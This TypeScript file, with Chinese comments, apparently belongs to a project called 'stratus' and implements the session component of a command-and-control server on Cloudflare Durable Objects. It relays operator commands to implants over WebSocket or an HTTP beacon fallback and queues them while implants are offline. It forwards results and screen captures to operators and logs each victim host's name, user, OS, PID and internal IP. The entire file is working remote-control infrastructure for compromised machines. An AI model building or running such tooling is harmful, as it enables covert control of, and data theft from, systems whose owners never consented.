/**
 * SessionDO —— 一个会话一个对象。
 *
 * 职责（只做这四件事）：
 *   1) 接住植入体的 WebSocket（hibernation），并把帧**原样**转给操作员
 *   2) 接住操作员 WebSocket，把帧原样转给植入体；离线时入队
 *   3) 用单调计数做重放/去重（transport 层）
 *   4) 把"任务已投递/结果已到达"这类**元数据**写回 D1（异步，攒批）
 *
 * 它**不做**：解密、解析业务、存文件、查列表。
 */

import { decodeFrame, encodeFrame, PING_TEXT, PONG_TEXT, type Frame } from '@stratus/shared';
import { createDb, eq, t } from '@stratus/db';
import type { Env } from '../types';

interface PendingRow {
  tid: string;
  ct: string;
  n: string;
  cat: string;
  rid: string;
  exp: number;
}

interface CounterRow {
  k: string;
  v: number;
}

interface Attachment {
  role: 'implant' | 'operator';
  sid: string;
  opId?: string;
}

const META_TTL_SEC = 7 * 86400;

export class SessionDO {
  private readonly sql: SqlStorage;
  private seqIn = 0;
  private seqOut = 0;
  private dirty = 0;

  constructor(
    private readonly ctx: DurableObjectState,
    private readonly env: Env,
  ) {
    this.sql = ctx.storage.sql;
    ctx.blockConcurrencyWhile(async () => {
      this.sql.exec(`CREATE TABLE IF NOT EXISTS pending (
        tid TEXT PRIMARY KEY, ct TEXT NOT NULL, n TEXT NOT NULL,
        cat TEXT NOT NULL, rid TEXT NOT NULL, exp INTEGER NOT NULL)`);
      this.sql.exec(`CREATE TABLE IF NOT EXISTS counters (k TEXT PRIMARY KEY, v INTEGER NOT NULL)`);
      this.sql.exec(`CREATE TABLE IF NOT EXISTS meta (k TEXT PRIMARY KEY, v TEXT NOT NULL)`);
      const rows = this.sql.exec('SELECT k, v FROM counters').toArray() as Array<Record<string, unknown>>;
      for (const r of rows) {
        if (r['k'] === 'seq_in') this.seqIn = Number(r['v']);
        if (r['k'] === 'seq_out') this.seqOut = Number(r['v']);
      }
    });
  }

  /* ───────────────────────────── 路由 ───────────────────────────── */

  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    switch (url.pathname) {
      case '/ws':
        return this.handleWs(req, url);
      case '/enqueue':
        return this.handleEnqueue(req);
      case '/beacon':
        return this.handleBeacon(req);
      case '/state':
        return this.handleState();
      case '/presence':
        return Response.json({ implant: this.implantSockets().length, operators: this.operatorSockets().length });
      default:
        return new Response('not found', { status: 404 });
    }
  }

  private async handleWs(req: Request, url: URL): Promise<Response> {
    if (req.headers.get('upgrade') !== 'websocket') {
      return new Response('expected websocket', { status: 426 });
    }
    const role = url.searchParams.get('role') === 'operator' ? 'operator' : 'implant';
    const sid = this.ctx.id.name ?? 'unknown';
    const opId = req.headers.get('x-stc2-operator') ?? undefined;

    const pair = new WebSocketPair();
    const client = pair[0];
    const server = pair[1];

    this.ctx.acceptWebSocket(server);
    const att: Attachment = role === 'operator' ? { role, sid, opId } : { role, sid };
    server.serializeAttachment(att);

    // 纯心跳走自动应答：不唤醒对象、不计 duration
    this.ctx.setWebSocketAutoResponse(new WebSocketRequestResponsePair(PING_TEXT, PONG_TEXT));

    if (role === 'implant') {
      await this.setStatus('online');
      this.ctx.waitUntil(this.broadcast(encodeFrame({ v: 1, t: 'hb_ack', seq: 0, sid })));
    }

    return new Response(null, { status: 101, webSocket: client });
  }

  /* ───────────────────────────── 入队 ───────────────────────────── */

  private async handleEnqueue(req: Request): Promise<Response> {
    const body = (await req.json()) as PendingRow & { sender?: string };
    if (!body?.tid || !body.ct || !body.n) return new Response('bad request', { status: 400 });

    const exp = body.exp || Math.floor(Date.now() / 1000) + 300;
    this.sql.exec(
      `INSERT INTO pending (tid, ct, n, cat, rid, exp) VALUES (?, ?, ?, ?, ?, ?)
       ON CONFLICT(tid) DO UPDATE SET ct=excluded.ct, n=excluded.n, exp=excluded.exp`,
      body.tid,
      body.ct,
      body.n,
      body.cat ?? 'e2e',
      body.rid ?? '',
      exp,
    );

    const sockets = this.implantSockets();
    if (sockets.length === 0) {
      await this.ensureAlarm();
      return Response.json({ online: false, queued: true });
    }

    const frame = encodeFrame({
      v: 1,
      t: 'cmd',
      sid: this.ctx.id.name ?? undefined,
      seq: ++this.seqOut,
      n: body.n,
      ct: body.ct,
      meta: { tid: body.tid, rid: body.rid, cat: body.cat ?? 'e2e', exp },
    });
    for (const ws of sockets) {
      try {
        ws.send(frame);
      } catch {
        /* 单个 socket 失败不影响其它 */
      }
    }
    await this.persistCounters();
    return Response.json({ online: true, queued: true });
  }

  private async handleState(): Promise<Response> {
    const pending = this.sql.exec<{ n: number }>('SELECT COUNT(*) AS n FROM pending').toArray()[0]?.n ?? 0;
    return Response.json({
      sid: this.ctx.id.name,
      seqIn: this.seqIn,
      seqOut: this.seqOut,
      pending,
      implant: this.implantSockets().length,
      operators: this.operatorSockets().length,
    });
  }

  /* ───────────────────────────── WebSocket 事件 ───────────────────────────── */

  async webSocketMessage(ws: WebSocket, message: ArrayBuffer | string): Promise<void> {
    const att = ws.deserializeAttachment() as Attachment | null;
    const text = typeof message === 'string' ? message : new TextDecoder().decode(message);

    let frame: Frame;
    try {
      frame = decodeFrame(text);
    } catch {
      ws.close(1008, 'bad frame');
      return;
    }

    if (att?.role === 'operator') {
      // 操作员帧：原样转发给植入体（不解密、不改写）
      const targets = this.implantSockets();
      if (targets.length === 0) {
        ws.send(JSON.stringify({ t: 'err', seq: 0, meta: { code: 'E_OFFLINE' } }));
        return;
      }
      for (const t of targets) {
        try {
          t.send(text);
        } catch {
          /* ignore */
        }
      }
      return;
    }

    // 植入体帧
    if (!this.acceptSeq(frame.seq)) {
      return; // 重放/重复，静默丢弃并计数
    }

    if (frame.t === 'hello') {
      await this.onHello(frame);
      ws.send(encodeFrame({ v: 1, t: 'hello_ack', seq: ++this.seqOut, sid: this.ctx.id.name ?? undefined }));
      return;
    }

    await this.processInbound(frame, text);
  }

  /**
   * 处理一条上行业务帧（WS 与 HTTP beacon 共用）。
   * 不解密、不改写：只做去重、状态更新、广播。
   */
  private async processInbound(frame: Frame, rawText: string): Promise<void> {
    if (frame.t === 'ack') {
      const tid = String(frame.meta?.['tid'] ?? '');
      if (tid) this.sql.exec('DELETE FROM pending WHERE tid = ?', tid);
      return;
    }

    if (frame.t === 'res') {
      const tid = String(frame.meta?.['tid'] ?? '');
      const sz = Number(frame.meta?.['sz'] ?? 0);
      if (tid) {
        this.sql.exec('DELETE FROM pending WHERE tid = ?', tid);
        this.ctx.waitUntil(this.persistResult(tid, frame, sz));
      }
      await this.broadcast(rawText);
      return;
    }

    if (frame.t === 'screen') {
      await this.broadcast(rawText);
      this.ctx.waitUntil(this.touchSession(`screen:${String(frame.meta?.['key'] ?? '')}`));
      return;
    }

    await this.broadcast(rawText);
  }

  /**
   * HTTP 兜底通道：一次请求交一批、取一批。
   * 与 WS 共用同一套 pending 队列与 seq 计数。
   */
  private async handleBeacon(req: Request): Promise<Response> {
    const body = (await req.json()) as {
      up?: Array<{ t?: string; seq?: number; n?: string; ct?: string; meta?: Record<string, unknown> }>;
      want?: number;
    };
    const up = Array.isArray(body.up) ? body.up.slice(0, 32) : [];
    const want = Math.min(Math.max(Number(body.want ?? 8), 0), 20);

    for (const raw of up) {
      if (typeof raw?.seq !== 'number') continue;
      if (!this.acceptSeq(raw.seq)) continue;
      const frame = raw as Frame;
      await this.processInbound(frame, JSON.stringify(raw));
    }

    const rows = this.sql.exec(
      'SELECT tid, ct, n, cat, rid, exp FROM pending ORDER BY exp ASC LIMIT ?',
      want,
    ).toArray() as unknown as PendingRow[];

    const now = Math.floor(Date.now() / 1000);
    const down = rows
      .filter((r) => Number(r.exp) > now)
      .map((r) => {
        const seq = ++this.seqOut;
        return {
          t: 'cmd',
          seq,
          n: String(r.n),
          ct: String(r.ct),
          meta: { tid: String(r.tid), cat: String(r.cat), exp: Number(r.exp) },
        };
      });

    await this.persistCounters();
    return Response.json({ down, next: 300, srv_ts: now }, { headers: { 'cache-control': 'no-store' } });
  }

  async webSocketClose(ws: WebSocket, code: number, reason: string, _wasClean: boolean): Promise<void> {
    const att = ws.deserializeAttachment() as Attachment | null;
    if (att?.role === 'implant') {
      await this.persistCounters();
      await this.setStatus('offline');
      this.ctx.waitUntil(this.broadcast(JSON.stringify({ t: 'err', seq: 0, meta: { code: 'E_IMPLANT_OFFLINE' } })));
    }
    try {
      ws.close(code, reason);
    } catch {
      /* already closed */
    }
  }

  async alarm(): Promise<void> {
    const now = Math.floor(Date.now() / 1000);
    this.sql.exec('DELETE FROM pending WHERE exp < ?', now);
    this.sql.exec('DELETE FROM meta WHERE k LIKE ? AND CAST(v AS INTEGER) < ?', 'tmp:%', now - META_TTL_SEC / 7);
    await this.persistCounters();

    const remaining = this.sql.exec<{ n: number }>('SELECT COUNT(*) AS n FROM pending').toArray()[0]?.n ?? 0;
    if (remaining > 0) {
      this.ctx.storage.setAlarm(Date.now() + 50_000);
    }
    if (this.implantSockets().length === 0) {
      await this.setStatus('offline');
    }
    this.dirty = 0;
  }

  /* ───────────────────────────── 内部 ───────────────────────────── */

  private acceptSeq(seq: number): boolean {
    if (!Number.isInteger(seq) || seq <= 0) return false;
    if (seq <= this.seqIn) return false;
    this.seqIn = seq;
    if (++this.dirty >= 32) this.ctx.waitUntil(this.persistCounters());
    return true;
  }

  private async persistCounters(): Promise<void> {
    this.dirty = 0;
    this.sql.exec(
      `INSERT INTO counters (k, v) VALUES ('seq_in', ?) ON CONFLICT(k) DO UPDATE SET v=excluded.v`,
      this.seqIn,
    );
    this.sql.exec(
      `INSERT INTO counters (k, v) VALUES ('seq_out', ?) ON CONFLICT(k) DO UPDATE SET v=excluded.v`,
      this.seqOut,
    );
  }

  private async onHello(frame: Frame): Promise<void> {
    const sid = this.ctx.id.name ?? '';
    const caps = Array.isArray(frame.meta?.['caps']) ? JSON.stringify(frame.meta?.['caps']) : null;
    const host = typeof frame.meta?.['host'] === 'string' ? frame.meta['host'] : null;
    const user = typeof frame.meta?.['user'] === 'string' ? frame.meta['user'] : null;
    const os = typeof frame.meta?.['os'] === 'string' ? frame.meta['os'] : null;
    const arch = typeof frame.meta?.['arch'] === 'string' ? frame.meta['arch'] : null;
    const pid = typeof frame.meta?.['pid'] === 'number' ? frame.meta['pid'] : null;
    const ip = typeof frame.meta?.['ip'] === 'string' ? frame.meta['ip'] : null;

    await this.setStatus('online');
    const db = createDb(this.env.DB);
    this.ctx.waitUntil(
      db
        .update(t.sessions)
        .set({
          ...(host ? { host } : {}),
          ...(user ? { username: user } : {}),
          ...(os ? { os } : {}),
          ...(arch ? { arch } : {}),
          ...(pid !== null ? { pid } : {}),
          ...(ip ? { internalIp: ip } : {}),
          ...(caps ? { caps } : {}),
          lastSeen: Math.floor(Date.now() / 1000),
        })
        .where(eq(t.sessions.id, sid))
        .run()
        .catch(() => undefined),
    );
  }

  private async setStatus(status: 'online' | 'offline'): Promise<void> {
    const sid = this.ctx.id.name ?? '';
    this.sql.exec(
      `INSERT INTO meta (k, v) VALUES ('status', ?) ON CONFLICT(k) DO UPDATE SET v=excluded.v`,
      status,
    );
    const db = createDb(this.env.DB);
    this.ctx.waitUntil(
      db
        .update(t.sessions)
        .set({ status, lastSeen: Math.floor(Date.now() / 1000) })
        .where(eq(t.sessions.id, sid))
        .run()
        .catch(() => undefined),
    );
  }

  private async touchSession(_tag: string): Promise<void> {
    const sid = this.ctx.id.name ?? '';
    const db = createDb(this.env.DB);
    await db
      .update(t.sessions)
      .set({ lastSeen: Math.floor(Date.now() / 1000) })
      .where(eq(t.sessions.id, sid))
      .run();
  }

  private async markTaskDone(tid: string, sz: number): Promise<void> {
    const sid = this.ctx.id.name ?? '';
    const now = Math.floor(Date.now() / 1000);
    const db = createDb(this.env.DB);
    await db.batch([
      db
        .update(t.tasks)
        .set({ status: 'done', completedAt: now, ...(sz ? { size: sz } : {}) })
        .where(eq(t.tasks.id, tid)),
      db.update(t.sessions).set({ lastSeen: now }).where(eq(t.sessions.id, sid)),
    ]);
  }

  /**
   * 结果落库：≤4 KB 内联进 D1，>4 KB 写 R2 只留索引。
   * 服务端**不解析**内容——它拿到的只是密文。
   */
  private async persistResult(tid: string, frame: Frame, sz: number): Promise<void> {
    const sid = this.ctx.id.name ?? '';
    const now = Math.floor(Date.now() / 1000);
    const ct = frame.ct ?? '';
    const db = createDb(this.env.DB);

    let r2Key: string | null = null;
    if (ct.length > 5600) {
      // base64 膨胀 4/3，5600 ≈ 4 KB 明文
      r2Key = `${this.env.ENV_NAME}/sessions/${sid}/results/${tid}.bin`;
      await this.env.R2.put(r2Key, ct, {
        httpMetadata: { contentType: 'text/plain; charset=utf-8' },
        customMetadata: { sid, tid },
      });
    }

    await db.batch([
      db.insert(t.taskResults).values({
        id: crypto.randomUUID(),
        taskId: tid,
        sessionId: sid,
        inlineCt: r2Key ? null : ct,
        r2Key,
        nonce: frame.n ?? null,
        rid: String(frame.meta?.['rid'] ?? ''),
        size: sz || ct.length,
        createdAt: now,
      }),
      db.update(t.tasks).set({ status: 'done', completedAt: now }).where(eq(t.tasks.id, tid)),
      db.update(t.sessions).set({ lastSeen: now }).where(eq(t.sessions.id, sid)),
    ]);
  }

  private async broadcast(text: string): Promise<void> {
    for (const ws of this.operatorSockets()) {
      try {
        ws.send(text);
      } catch {
        /* 慢消费者：直接丢帧，不阻塞 DO */
      }
    }
  }

  private implantSockets(): WebSocket[] {
    return this.ctx
      .getWebSockets()
      .filter((ws) => (ws.deserializeAttachment() as Attachment | null)?.role === 'implant');
  }

  private operatorSockets(): WebSocket[] {
    return this.ctx
      .getWebSockets()
      .filter((ws) => (ws.deserializeAttachment() as Attachment | null)?.role === 'operator');
  }

  private async ensureAlarm(): Promise<void> {
    const cur = await this.ctx.storage.getAlarm();
    if (cur === null) this.ctx.storage.setAlarm(Date.now() + 60_000);
  }
}
